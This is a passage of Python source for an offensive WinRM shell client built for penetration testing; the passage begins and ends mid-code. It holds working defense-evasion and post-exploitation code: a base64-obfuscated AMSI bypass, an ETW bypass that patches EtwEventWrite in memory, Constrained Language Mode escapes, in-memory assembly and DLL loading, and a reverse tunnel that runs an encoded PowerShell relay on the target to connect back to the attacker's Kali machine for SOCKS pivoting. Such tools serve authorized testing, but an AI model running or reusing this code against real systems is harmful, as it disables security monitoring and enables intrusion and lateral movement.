    """Local SOCKS5 server that tunnels TCP connections through WinRM."""

    def __init__(self, main_client, listen_port=1080):
        self.main_client = main_client
        self.listen_port = listen_port
        self.server_sock = None
        self.running = False
        self.tunnels: list[TunnelConnection] = []
        self._accept_thread = None

    def start(self):
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind(("127.0.0.1", self.listen_port))
        self.server_sock.listen(10)
        self.running = True
        self._accept_thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._accept_thread.start()
        good(f"SOCKS5 proxy listening on 127.0.0.1:{self.listen_port}")
        info("Configure your tools: proxychains, --proxy socks5://127.0.0.1:" +
             str(self.listen_port))

    def stop(self):
        self.running = False
        for t in self.tunnels:
            t.close()
        self.tunnels.clear()
        if self.server_sock:
            try:
                self.server_sock.close()
            except OSError:
                pass
            self.server_sock = None
        good("SOCKS5 proxy stopped")

    def _accept_loop(self):
        while self.running:
            try:
                self.server_sock.settimeout(1.0)
                client_sock, addr = self.server_sock.accept()
                tunnel = TunnelConnection(self.main_client, client_sock, addr)
                self.tunnels.append(tunnel)
                threading.Thread(target=tunnel.handle, daemon=True).start()
            except socket.timeout:
                self._cleanup()
                continue
            except OSError:
                break

    def _cleanup(self):
        self.tunnels = [t for t in self.tunnels if t.active]

    @property
    def active_count(self):
        self._cleanup()
        return len(self.tunnels)


# -- Reverse TCP Tunnel (native, no external binary) ---------------------------

class ReverseTunnel:
    """Multiplexed reverse TCP tunnel with built-in SOCKS5 proxy.

    Instead of relaying each packet through WinRM SOAP (slow), this opens a
    single direct TCP connection from the target back to Kali. All SOCKS
    traffic is multiplexed over that connection with minimal framing overhead.
    """

    CONNECT = 0x01
    CONNECT_RESP = 0x02
    DATA = 0x03
    CLOSE = 0x04
    READY = 0xFF

    def __init__(self, winrm_client, listen_port=1080):
        self.client = winrm_client
        self.listen_port = listen_port
        self.tunnel_port = 0
        self.kali_ip = None
        self.listener = None
        self.tunnel_sock = None
        self.socks_server = None
        self.channels = {}
        self._chan_events = {}
        self._chan_results = {}
        self._next_cid = 1
        self._alloc_lock = threading.Lock()
        self._write_lock = threading.Lock()
        self.running = False

    def _get_kali_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((self.client.host, 80))
            return s.getsockname()[0]
        finally:
            s.close()

    @staticmethod
    def _free_port():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('', 0))
        port = s.getsockname()[1]
        s.close()
        return port

    def _write_frame(self, ftype, cid, data=b''):
        header = struct.pack('>BHI', ftype, cid, len(data))
        with self._write_lock:
            self.tunnel_sock.sendall(header + data)

    def _read_frame(self):
        header = self._recv_exact(7)
        if not header:
            return None
        ftype, cid, length = struct.unpack('>BHI', header)
        data = self._recv_exact(length) if length else b''
        if data is None:
            return None
        return ftype, cid, data

    def _recv_exact(self, n):
        buf = bytearray()
        while len(buf) < n:
            try:
                chunk = self.tunnel_sock.recv(n - len(buf))
                if not chunk:
                    return None
                buf.extend(chunk)
            except (OSError, ConnectionError):
                return None
        return bytes(buf)

    def _alloc_cid(self):
        with self._alloc_lock:
            cid = self._next_cid
            self._next_cid = (cid % 65534) + 1
            return cid

    # -- Background threads ----------------------------------------------------

    def _tunnel_reader(self):
        """Read frames from the reverse connection and dispatch."""
        while self.running:
            frame = self._read_frame()
            if not frame:
                break
            ftype, cid, data = frame
            if ftype == self.CONNECT_RESP:
                self._chan_results[cid] = data[0] if data else 1
                evt = self._chan_events.get(cid)
                if evt:
                    evt.set()
            elif ftype == self.DATA:
                sock = self.channels.get(cid)
                if sock:
                    try:
                        sock.sendall(data)
                    except OSError:
                        self._close_channel(cid)
            elif ftype == self.CLOSE:
                sock = self.channels.pop(cid, None)
                if sock:
                    try:
                        sock.close()
                    except OSError:
                        pass
        self.running = False

    def _close_channel(self, cid):
        sock = self.channels.pop(cid, None)
        if sock:
            try:
                sock.close()
            except OSError:
                pass
        try:
            self._write_frame(self.CLOSE, cid)
        except (OSError, ConnectionError):
            pass

    def _handle_socks(self, csock, addr):
        """Handle one SOCKS5 client: handshake, then relay via tunnel."""
        cid = None
        try:
            data = csock.recv(256)
            if len(data) < 2 or data[0] != 0x05:
                csock.close()
                return
            csock.sendall(b'\x05\x00')

            data = csock.recv(512)
            if len(data) < 7 or data[1] != 0x01:
                csock.sendall(b'\x05\x07\x00\x01' + b'\x00' * 6)
                csock.close()
                return

            atyp = data[3]
            if atyp == 0x01:
                dst = socket.inet_ntoa(data[4:8])
                port = struct.unpack('!H', data[8:10])[0]
            elif atyp == 0x03:
                dlen = data[4]
                dst = data[5:5 + dlen].decode('ascii', errors='replace')
                port = struct.unpack('!H', data[5 + dlen:7 + dlen])[0]
            elif atyp == 0x04:
                dst = socket.inet_ntop(socket.AF_INET6, data[4:20])
                port = struct.unpack('!H', data[20:22])[0]
            else:
                csock.sendall(b'\x05\x08\x00\x01' + b'\x00' * 6)
                csock.close()
                return

            cid = self._alloc_cid()
            self.channels[cid] = csock
            self._chan_events[cid] = threading.Event()

            self._write_frame(self.CONNECT, cid, f'{dst}:{port}'.encode())

            if not self._chan_events[cid].wait(timeout=15):
                csock.sendall(b'\x05\x04\x00\x01' + b'\x00' * 6)
                self.channels.pop(cid, None)
                self._chan_events.pop(cid, None)
                csock.close()
                return

            result = self._chan_results.pop(cid, 1)
            self._chan_events.pop(cid, None)

            if result != 0:
                csock.sendall(b'\x05\x05\x00\x01' + b'\x00' * 6)
                self.channels.pop(cid, None)
                csock.close()
                return

            csock.sendall(b'\x05\x00\x00\x01' + b'\x00' * 6)
            csock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            csock.settimeout(0.5)

            while self.running:
                try:
                    data = csock.recv(131072)
                    if not data:
                        break
                    self._write_frame(self.DATA, cid, data)
                except socket.timeout:
                    if cid not in self.channels:
                        break
                    continue
                except (OSError, ConnectionError):
                    break

            self._close_channel(cid)
        except Exception:
            if cid:
                self._close_channel(cid)
            try:
                csock.close()
            except OSError:
                pass

    def _socks_loop(self):
        while self.running:
            try:
                self.socks_server.settimeout(1.0)
                csock, addr = self.socks_server.accept()
                threading.Thread(target=self._handle_socks,
                                 args=(csock, addr), daemon=True).start()
            except socket.timeout:
                continue
            except OSError:
                break

    # -- Public API ------------------------------------------------------------

    def start(self, kali_ip=None):
        self.kali_ip = kali_ip or self._get_kali_ip()
        self.tunnel_port = self._free_port()

        info(f"Kali IP: {self.kali_ip}")

        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind(('0.0.0.0', self.tunnel_port))
        self.listener.listen(1)
        self.listener.settimeout(45)
        info(f"Listener on :{self.tunnel_port}, launching relay on target...")

        script = (TUNNEL_RELAY_PS
                  .replace('__KALI__', self.kali_ip)
                  .replace('__PORT__', str(self.tunnel_port)))

        def run_relay():
            try:
                c = self.client.clone()
                sid = c.create_shell()
                enc = c._ps_encode(script)
                cid = c.run_command(sid, 'powershell.exe',
                    ['-NoP', '-NonI', '-Exec', 'Bypass', '-EncodedCommand', enc])
                c.get_output(sid, cid)
                c.close_shell(sid)
                c.session.close()
            except Exception:
                pass

        threading.Thread(target=run_relay, daemon=True).start()

        try:
            self.tunnel_sock, addr = self.listener.accept()
            self.tunnel_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            self.tunnel_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)
            self.tunnel_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
        except socket.timeout:
            error(f"No reverse connection. Target cannot reach {self.kali_ip}:{self.tunnel_port}")
            self.listener.close()
            return False

        frame = self._read_frame()
        if not frame or frame[0] != self.READY:
            error("Invalid handshake from relay")
            self.tunnel_sock.close()
            self.listener.close()
            return False

        good(f"Reverse tunnel from {addr[0]}")
        self.listener.close()
        self.listener = None

        self.running = True
        threading.Thread(target=self._tunnel_reader, daemon=True).start()

        self.socks_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socks_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socks_server.bind(('127.0.0.1', self.listen_port))
        self.socks_server.listen(20)
        threading.Thread(target=self._socks_loop, daemon=True).start()

        good(f"SOCKS5 on 127.0.0.1:{self.listen_port} (fast reverse tunnel)")
        info("proxychains or --proxy socks5://127.0.0.1:" + str(self.listen_port))
        return True

    def stop(self):
        self.running = False
        if self.tunnel_sock:
            try:
                self.tunnel_sock.close()
            except OSError:
                pass
        for sock in list(self.channels.values()):
            try:
                sock.close()
            except OSError:
                pass
        self.channels.clear()
        if self.socks_server:
            try:
                self.socks_server.close()
            except OSError:
                pass
        if self.listener:
            try:
                self.listener.close()
            except OSError:
                pass
        good("Reverse tunnel stopped")

    @property
    def active_count(self):
        return len(self.channels)


# -- Interactive Shell ---------------------------------------------------------

class InteractiveShell(cmd.Cmd):
    def __init__(self, client, user, host, scripts_path=None,
                 executables_path=None, log_file=None):
        super().__init__()
        self.client = client
        self.user = user
        self.host = host
        self.cwd = "C:\\"
        self.scripts_path = scripts_path
        self.executables_path = executables_path
        self.log_file = log_file
        self.loaded_functions = []
        self.socks_proxy = None
        self.reverse_tunnel = None
        self._history_file = os.path.expanduser("~/.winrmshell_history")
        self._update_prompt()

    def _update_prompt(self):
        if NO_COLOR:
            self.prompt = f"PS {self.cwd}> "
        else:
            rl = "\001"
            re_ = "\002"
            self.prompt = (
                f"{rl}{C.BOLD}{C.RED}{re_}WinRM{rl}{C.RESET}{re_} "
                f"{rl}{C.YELLOW}{re_}PS{rl}{C.RESET}{re_} "
                f"{rl}{C.CYAN}{re_}{self.cwd}{rl}{C.RESET}{re_}> "
            )

    def preloop(self):
        if readline:
            try:
                readline.read_history_file(self._history_file)
            except (FileNotFoundError, OSError):
                pass
            readline.set_history_length(2000)

        try:
            stdout, stderr, rc = self.client.execute_ps("(Get-Location).Path")
            if rc == 0 and stdout.strip():
                self.cwd = stdout.strip()
                self._update_prompt()
        except Exception:
            pass

    def postloop(self):
        if readline:
            try:
                readline.write_history_file(self._history_file)
            except OSError:
                pass

    def _log(self, entry):
        if not self.log_file:
            return
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(f"[{ts}] {entry}\n")
        except OSError:
            pass

    def _run_ps(self, command):
        self._log(f"CMD: {command}")
        try:
            stdout, stderr, rc, new_cwd = self.client.execute_ps_with_cwd(
                command, self.cwd
            )
        except WinRMError as e:
            error(str(e))
            self._try_reconnect()
            return
        except KeyboardInterrupt:
            warn("Command interrupted")
            return

        self.cwd = new_cwd
        self._update_prompt()

        if stdout:
            print(stdout)
            self._log(f"OUT: {stdout[:500]}")
        if stderr:
            # Filter out CLIXML progress messages (module loading noise)
            cleaned = self._clean_clixml(stderr)
            if cleaned.strip():
                print(co(cleaned, C.RED))
                self._log(f"ERR: {cleaned[:500]}")

    @staticmethod
    def _clean_clixml(text):
        """Strip PowerShell CLIXML progress/verbose noise from stderr."""
        # Remove the #< CLIXML header
        text = text.replace("#< CLIXML\r\n", "").replace("#< CLIXML\n", "")
        # Remove entire <Objs> blocks that only contain progress records
        text = re.sub(
            r'<Objs[^>]*>.*?</Objs>\s*',
            '',
            text,
            flags=re.DOTALL,
        )
        return text.strip()

    def _try_reconnect(self):
        warn("Connection lost. Reconnecting...")
        self.client.shell_id = None
        try:
            self.client.open_shell()
            good("Reconnected")
            return
        except Exception:
            pass
        try:
            self.client._rebuild_session()
            self.client.open_shell()
            good("Reconnected (new session)")
        except Exception as e:
            error(f"Reconnection failed: {e}")

    def _progress(self, current, total):
        pct = int(current / total * 100) if total else 100
        bar_len = 30
        filled = int(bar_len * current / total) if total else bar_len
        bar = "\u2588" * filled + "\u2591" * (bar_len - filled)
        sys.stdout.write(f"\r  [{bar}] {pct}% ({current}/{total} bytes)")
        sys.stdout.flush()
        if current >= total:
            print()

    # -- Default: execute as PowerShell ----------------------------------------

    def default(self, line):
        if not line.strip():
            return
        self._run_ps(line)

    def emptyline(self):
        pass

    # -- Built-in commands -----------------------------------------------------

    def do_upload(self, args):
        """Upload a file: upload <local_path> <remote_path>"""
        parts = args.strip().split(None, 1)
        if len(parts) < 2:
            warn("Usage: upload <local_path> <remote_path>")
            return
        local_path, remote_path = parts
        if not os.path.isfile(local_path):
            error(f"Local file not found: {local_path}")
            return
        info(f"Uploading {local_path} -> {remote_path}")
        try:
            size = self.client.upload(local_path, remote_path, self._progress)
            good(f"Uploaded {size} bytes")
            self._log(f"UPLOAD: {local_path} -> {remote_path} ({size} bytes)")
        except WinRMError as e:
            error(f"Upload failed: {e}")

    def do_download(self, args):
        """Download a file: download <remote_path> [local_path]"""
        parts = args.strip().split(None, 1)
        if not parts:
            warn("Usage: download <remote_path> [local_path]")
            return
        remote_path = parts[0]
        local_path = parts[1] if len(parts) > 1 else os.path.basename(remote_path)
        info(f"Downloading {remote_path} -> {local_path}")
        try:
            size = self.client.download(remote_path, local_path, self._progress)
            good(f"Downloaded {size} bytes")
            self._log(f"DOWNLOAD: {remote_path} -> {local_path} ({size} bytes)")
        except WinRMError as e:
            error(f"Download failed: {e}")

    def do_clearhistory(self, args):
        """Clear the local command history and history file"""
        if readline:
            readline.clear_history()
        try:
            os.remove(self._history_file)
        except OSError:
            pass
        good("History cleared")

    def do_services(self, args):
        """List Windows services"""
        info("Listing services...")
        self._run_ps(
            "Get-Service | Sort-Object Status -Descending "
            "| Format-Table Status,Name,DisplayName -AutoSize"
        )

    def do_processes(self, args):
        """List running processes"""
        info("Listing processes...")
        self._run_ps(
            "Get-Process | Sort-Object CPU -Descending "
            "| Select-Object -First 50 "
            "| Format-Table Id,ProcessName,@{N='CPU(s)';E={'{0:N2}' -f $_.CPU}},"
            "@{N='Mem(MB)';E={'{0:N0}' -f ($_.WS/1MB)}} -AutoSize"
        )

    def do_load(self, args):
        """Load a PowerShell script into memory: load <script.ps1>"""
        script_path = args.strip()
        if not script_path:
            if self.scripts_path:
                info(f"Available scripts in {self.scripts_path}:")
                try:
                    for f in sorted(Path(self.scripts_path).glob("*.ps1")):
                        print(f"  {f.name}")
                except OSError as e:
                    error(str(e))
            else:
                warn("Usage: load <script.ps1>  (or set -s/--scripts path)")
            return

        full_path = script_path
        if self.scripts_path and not os.path.isfile(full_path):
            full_path = os.path.join(self.scripts_path, script_path)
        if not os.path.isfile(full_path):
            error(f"Script not found: {script_path}")
            return

        info(f"Loading {os.path.basename(full_path)} into memory...")
        try:
            with open(full_path, "r", encoding="utf-8-sig") as f:
                content = f.read()
        except OSError as e:
            error(f"Cannot read file: {e}")
            return

        stdout, stderr, rc = self.client.execute_ps(content)
        if rc == 0:
            good(f"Script loaded: {os.path.basename(full_path)}")
            funcs = re.findall(r'(?i)function\s+([\w-]+)', content)
            if funcs:
                self.loaded_functions.extend(funcs)
                info(f"Functions available: {', '.join(funcs)}")
        else:
            error(f"Script load failed: {stderr.strip()}")

    def do_invoke_binary(self, args):
        """Load and execute a .NET assembly: invoke-binary <exe> [args...]"""
        parts = args.strip().split(None, 1)
        if not parts:
            if self.executables_path:
                info(f"Available binaries in {self.executables_path}:")
                try:
                    for f in sorted(Path(self.executables_path).iterdir()):
                        if f.suffix.lower() in (".exe", ".dll"):
                            print(f"  {f.name}")
                except OSError as e:
                    error(str(e))
            else:
                warn("Usage: invoke-binary <path.exe> [args]")
            return

        exe_path = parts[0]
        exe_args = parts[1] if len(parts) > 1 else ""

        full_path = exe_path
        if self.executables_path and not os.path.isfile(full_path):
            full_path = os.path.join(self.executables_path, exe_path)
        if not os.path.isfile(full_path):
            error(f"Binary not found: {exe_path}")
            return

        info(f"Loading assembly: {os.path.basename(full_path)}...")
        try:
            with open(full_path, "rb") as f:
                data = f.read()
        except OSError as e:
            error(f"Cannot read file: {e}")
            return

        b64 = base64.b64encode(data).decode("ascii")
        if exe_args:
            arg_array = ",".join(f'"{a}"' for a in exe_args.split())
            ps = (
                f'$a=[Reflection.Assembly]::Load([Convert]::FromBase64String("{b64}"));'
                f'$a.EntryPoint.Invoke($null,@(,[string[]]@({arg_array})))'
            )
        else:
            ps = (
                f'$a=[Reflection.Assembly]::Load([Convert]::FromBase64String("{b64}"));'
                f'$a.EntryPoint.Invoke($null,@(,[string[]]@()))'
            )
        info("Executing...")
        self._run_ps(ps)

    def do_dll_loader(self, args):
        """Load a DLL into memory: dll-loader <path.dll>"""
        dll_path = args.strip()
        if not dll_path:
            warn("Usage: dll-loader <path.dll>")
            return
        if not os.path.isfile(dll_path):
            error(f"DLL not found: {dll_path}")
            return

        info(f"Loading DLL: {os.path.basename(dll_path)}...")
        try:
            with open(dll_path, "rb") as f:
                data = f.read()
        except OSError as e:
            error(f"Cannot read file: {e}")
            return

        b64 = base64.b64encode(data).decode("ascii")
        ps = f'[Reflection.Assembly]::Load([Convert]::FromBase64String("{b64}"))'
        stdout, stderr, rc = self.client.execute_ps(ps)
        if rc == 0:
            good("DLL loaded into memory")
            if stdout.strip():
                print(stdout.strip())
        else:
            error(f"DLL load failed: {stderr.strip()}")

    # -- Bypass commands -------------------------------------------------------

    def do_bypass(self, args):
        """Attempt AMSI bypass"""
        info("Running AMSI bypass...")
        ps = (
            '$e=[Text.Encoding]::UTF8;'
            '$t=[Ref].Assembly.GetType($e.GetString('
            '[Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=")));'
            '$f=$t.GetField($e.GetString('
            '[Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ=")),'
            '"NonPublic,Static");'
            '$f.SetValue($null,$true)'
        )
        stdout, stderr, rc = self.client.execute_ps(ps)
        if rc == 0:
            good("AMSI bypass successful")
        else:
            warn(f"AMSI bypass may have failed: {stderr.strip()}")

    def do_bypass_etw(self, args):
        """Patch EtwEventWrite in ntdll to disable ETW tracing"""
        info("Running AMSI bypass + ETW bypass...")
        # AMSI bypass first (same process) so AMSI won't scan the IEX content
        amsi = (
            '$e=[Text.Encoding]::UTF8;'
            '$t=[Ref].Assembly.GetType($e.GetString('
            '[Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=")));'
            '$f=$t.GetField($e.GetString('
            '[Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ=")),'
            '"NonPublic,Static");'
            '$f.SetValue($null,$true);'
        )
        # ETW bypass as base64 string decoded at runtime (after AMSI is disabled)
        etw_code = (
            '$k32=@"\n'
            'using System;using System.Runtime.InteropServices;\n'
            'public class K32{\n'
            '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);\n'
            '[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);\n'
            '[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);\n'
            '}\n'
            '"@;\n'
            'Add-Type $k32;'
            '$m=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("bnRkbGw="));'
            '$p=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="));'
            '$h=[K32]::LoadLibrary($m);'
            '$a=[K32]::GetProcAddress($h,$p);'
            '$o=0;'
            '[K32]::VirtualProtect($a,[uint32]1,0x40,[ref]$o)|Out-Null;'
            '[Runtime.InteropServices.Marshal]::WriteByte($a,0xC3);'
            '[K32]::VirtualProtect($a,[uint32]1,$o,[ref]$o)|Out-Null;'
            'Write-Output "ETW patched"'
        )
        etw_b64 = base64.b64encode(etw_code.encode('utf-16-le')).decode()
        ps = amsi + f'IEX([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("{etw_b64}")))'

        stdout, stderr, rc = self.client.execute_ps(ps)
        if rc == 0 and "patched" in (stdout or ""):
            good("ETW bypass successful -- EtwEventWrite returns immediately")
        else:
            cleaned = self._clean_clixml(stderr or "")
            warn(f"ETW bypass may have failed: {(cleaned or stdout or '').strip()}")

    def do_bypass_clm(self, args):
        """Attempt to escape PowerShell Constrained Language Mode"""
        info("Checking current language mode...")
        stdout, stderr, rc = self.client.execute_ps(
            "$ExecutionContext.SessionState.LanguageMode"
        )
        mode = stdout.strip() if rc == 0 else "unknown"
        info(f"Current mode: {mode}")

        if mode == "FullLanguage":
            good("Already in FullLanguage mode, no bypass needed")
            return

        # Method 1: direct assignment (works if not policy-enforced)
        info("Method 1: Direct LanguageMode assignment...")
        stdout, stderr, rc = self.client.execute_ps(
            '$ExecutionContext.SessionState.LanguageMode="FullLanguage";'
            '$ExecutionContext.SessionState.LanguageMode'
        )
        if rc == 0 and "FullLanguage" in (stdout or ""):
            good("CLM bypass successful (direct method)")
            return

        # Method 2: new runspace
        info("Method 2: Creating unrestricted runspace...")
        ps2 = (
            '$rs=[Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace();'
            '$rs.ApartmentState="STA";$rs.ThreadOptions="ReuseThread";$rs.Open();'
            '$p=[PowerShell]::Create();$p.Runspace=$rs;'
            '[void]$p.AddScript(\'$ExecutionContext.SessionState.LanguageMode\');'
            '$r=$p.Invoke();$r'
        )
        stdout, stderr, rc = self.client.execute_ps(ps2)
        if rc == 0 and "FullLanguage" in (stdout or ""):
            good("CLM bypass successful (runspace method)")
            info("NOTE: The bypass applies inside new runspaces. Wrap commands with:")
            print(co('  $rs=[Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace();$rs.Open();'
                     '$p=[PowerShell]::Create();$p.Runspace=$rs;'
                     '[void]$p.AddScript(\'YOUR_COMMAND_HERE\');$p.Invoke()', C.YELLOW))
            return

        # Method 3: PSBypassCLM via Add-Type (compile C# which runs unrestricted)
        info("Method 3: Add-Type escape...")
        ps3 = (
            '$code=@"\nusing System;using System.Management.Automation;\n'
            'public class CLMBypass{{\n'
            'public static string Run(string cmd){{\n'
            'var rs=System.Management.Automation.Runspaces.RunspaceFactory.CreateRunspace();\n'
            'rs.Open();var ps=PowerShell.Create();ps.Runspace=rs;\n'
            'ps.AddScript(cmd);var r=ps.Invoke();\n'
            'return string.Join("\\n",System.Linq.Enumerable.Select<object,string>(r,o=>o.ToString()));\n'
            '}}\n}}\n"@;\n'
            'Add-Type -TypeDefinition $code -Language CSharp;'
            '[CLMBypass]::Run("$ExecutionContext.SessionState.LanguageMode")'
        )
        stdout, stderr, rc = self.client.execute_ps(ps3)
        if rc == 0 and "FullLanguage" in (stdout or ""):
            good("CLM bypass successful (Add-Type method)")
            info("Use [CLMBypass]::Run('your command') to run in FullLanguage mode")
            return

        error("All CLM bypass methods failed -- likely enforced by WDAC/AppLocker policy")

    # -- SOCKS proxy -----------------------------------------------------------

    def do_socks(self, args):
        """SOCKS5 proxy: socks start [port] | socks stop | socks status"""
        parts = args.strip().split()
        action = parts[0].lower() if parts else "status"

        if action == "start":
            if self.socks_proxy and self.socks_proxy.running:
                warn(f"SOCKS proxy already running on port {self.socks_proxy.listen_port}")
                return
            port = int(parts[1]) if len(parts) > 1 else 1080
            try:
                self.socks_proxy = SocksProxy(self.client, port)
                self.socks_proxy.start()
            except OSError as e:
                error(f"Cannot start SOCKS proxy: {e}")

        elif action == "stop":
            if self.socks_proxy and self.socks_proxy.running:
                self.socks_proxy.stop()
                self.socks_proxy = None
            else:
                warn("SOCKS proxy is not running")

        elif action == "status":
            if self.socks_proxy and self.socks_proxy.running:
                info(f"SOCKS5 proxy running on 127.0.0.1:{self.socks_proxy.listen_port}")
                info(f"Active tunnels: {self.socks_proxy.active_count}")
            else:
                info("SOCKS proxy is not running. Start with: socks start [port]")
        else:
            warn("Usage: socks start [port] | socks stop | socks status")

    # -- Reverse tunnel --------------------------------------------------------

    def do_tunnel(self, args):
        """Fast reverse tunnel: tunnel start [port] [kali_ip] | stop | status"""
        parts = args.strip().split()
        action = parts[0].lower() if parts else "status"

        if action == "start":
            if self.reverse_tunnel and self.reverse_tunnel.running:
                warn(f"Tunnel already running on port {self.reverse_tunnel.listen_port}")
                return
            port = int(parts[1]) if len(parts) > 1 else 1080
            kali_ip = parts[2] if len(parts) > 2 else None

            if self.socks_proxy and self.socks_proxy.running and self.socks_proxy.listen_port == port:
                warn(f"WinRM SOCKS proxy using port {port}. Stop it first or pick another port.")
                return

            self.reverse_tunnel = ReverseTunnel(self.client, port)
            if not self.reverse_tunnel.start(kali_ip):
                self.reverse_tunnel = None

        elif action == "stop":
            if self.reverse_tunnel and self.reverse_tunnel.running:
                self.reverse_tunnel.stop()
                self.reverse_tunnel = None
            else:
                warn("No tunnel running")

        elif action == "status":
            if self.reverse_tunnel and self.reverse_tunnel.running:
                info(f"Reverse tunnel SOCKS5 on 127.0.0.1:{self.reverse_tunnel.listen_port}")
                info(f"Active channels: {self.reverse_tunnel.active_count}")
            else:
                info("No tunnel running. Start with: tunnel start [port] [kali_ip]")
        else:
            warn("Usage: tunnel start [port] [kali_ip] | tunnel stop | tunnel status")

    # -- Menu ------------------------------------------------------------------

    def do_menu(self, args):
        """Show available commands"""
        print()
        print(co("  +===============================================================+", C.CYAN))
        print(co("  |", C.CYAN) + co("                 WinRM Shell Commands", C.BOLD + C.WHITE) + co("                       |", C.CYAN))
        print(co("  +===============================================================+", C.CYAN))
        cmds = [
            ("upload",         "Upload file: upload <local> <remote>"),
            ("download",       "Download file: download <remote> [local]"),
            ("load",           "Load PS1 script into memory"),
            ("invoke-binary",  "Load & run .NET assembly in memory"),
            ("dll-loader",     "Load DLL into memory"),
            ("bypass",         "AMSI bypass (patch amsiInitFailed)"),
            ("bypass-etw",     "ETW bypass (patch EtwEventWrite)"),
            ("bypass-clm",     "CLM bypass (escape ConstrainedLanguage)"),
            ("socks",          "SOCKS5 proxy (over WinRM): start/stop/status"),
            ("tunnel",         "Fast reverse tunnel: start [port] [ip]/stop"),
            ("services",       "List Windows services"),
            ("processes",      "List running processes"),
            ("menu",           "Show this menu"),
            ("exit / quit",    "Exit the shell"),
        ]
        for name, desc in cmds:
            n = co(f"  {name:<18}", C.YELLOW)
            print(co("  | ", C.CYAN) + n + f" {desc:<42}" + co("|", C.CYAN))
        print(co("  +===============================================================+", C.CYAN))
        print(co("  |", C.CYAN) + "  Anything else is executed as PowerShell" + co("                   |", C.CYAN))
        print(co("  +===============================================================+", C.CYAN))
        print()

    def do_exit(self, args):
        """Exit the shell"""
        if self.reverse_tunnel and self.reverse_tunnel.running:
            info("Stopping reverse tunnel...")
            self.reverse_tunnel.stop()
            self.reverse_tunnel = None
        if self.socks_proxy and self.socks_proxy.running:
            info("Stopping SOCKS proxy...")
            self.socks_proxy.stop()
            self.socks_proxy = None
        info("Disconnecting...")
        self.client.disconnect()
        good("Session closed")
        return True

    def do_quit(self, args):
        """Exit the shell"""
        return self.do_exit(args)

    def do_EOF(self, args):
        print()
        return self.do_exit(args)

    # -- Tab completion --------------------------------------------------------

    def complete_upload(self, text, line, begidx, endidx):
        return self._complete_local_path(text)

    def complete_load(self, text, line, begidx, endidx):
        if self.scripts_path:
            try:
                files = [f.name for f in Path(self.scripts_path).glob("*.ps1")]
                return [f for f in files if f.lower().startswith(text.lower())]
            except OSError:
                pass
        return self._complete_local_path(text)

    def complete_invoke_binary(self, text, line, begidx, endidx):
        if self.executables_path:
            try:
                files = [f.name for f in Path(self.executables_path).iterdir()
                         if f.suffix.lower() in (".exe", ".dll")]
                return [f for f in files if f.lower().startswith(text.lower())]
            except OSError:
                pass
        return self._complete_local_path(text)

    def complete_dll_loader(self, text, line, begidx, endidx):
        return self._complete_local_path(text)

    def complete_socks(self, text, line, begidx, endidx):
        options = ["start", "stop", "status"]
        return [o for o in options if o.startswith(text.lower())]

    def complete_tunnel(self, text, line, begidx, endidx):
        options = ["start", "stop", "status"]
        return [o for o in options if o.startswith(text.lower())]

    def _complete_local_path(self, text):
        if not text:
            text = "."
        p = Path(text)
        if p.is_dir():
            parent = p
        else:
            parent = p.parent if str(p.parent) != "." else Path(".")
        try:
            entries = list(parent.iterdir())
            matches = []
            for e in entries:
                name = str(e)
                if name.lower().startswith(text.lower()):
                    if e.is_dir():
                        matches.append(name + os.sep)
                    else:
                        matches.append(name)
            return matches[:20]
        except OSError:
            return []

    def cmdloop_with_interrupt(self):
        self.do_menu("")
        while True:
            try:
                self.cmdloop()
                break
            except KeyboardInterrupt:
                print()
                continue

    # -- Handle hyphenated command names ----------------------------------------

    def parseline(self, line):
        line = line.strip()
        if not line:
            return None, None, line
        parts = line.split(None, 1)
        cmd_name = parts[0].replace("-", "_").lower()
        args = parts[1] if len(parts) > 1 else ""
        method = getattr(self, f"do_{cmd_name}", None)
        if method:
            return cmd_name, args, line
        return super().parseline(line)


# -- Banner & entry point -----------------------------------------------------

BANNER = r"""
{bold}{red}
    ╦ ╦┬┌┐┌╦═╗╔╦╗  ╔═╗┬ ┬┌─┐┬  ┬
    ║║║││││╠╦╝║║║  ╚═╗├─┤├┤ │  │
    ╚╩╝┴┘└┘╩╚═╩ ╩  ╚═╝┴ ┴└─┘┴─┘┴─┘{reset}
    {cyan}Custom WinRM Client v1.1{reset}
    {yellow}For authorized testing only{reset}
"""

def print_banner():
    b = BANNER.format(
        bold=C.BOLD, red=C.RED, cyan=C.CYAN, yellow=C.YELLOW, reset=C.RESET
    )
    if NO_COLOR:
        b = re.sub(r'\033\[[0-9;]*m', '', b)
    print(b)


def main():
    parser = argparse.ArgumentParser(
        description="WinRM Shell - Custom WinRM Client",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Examples:\n"
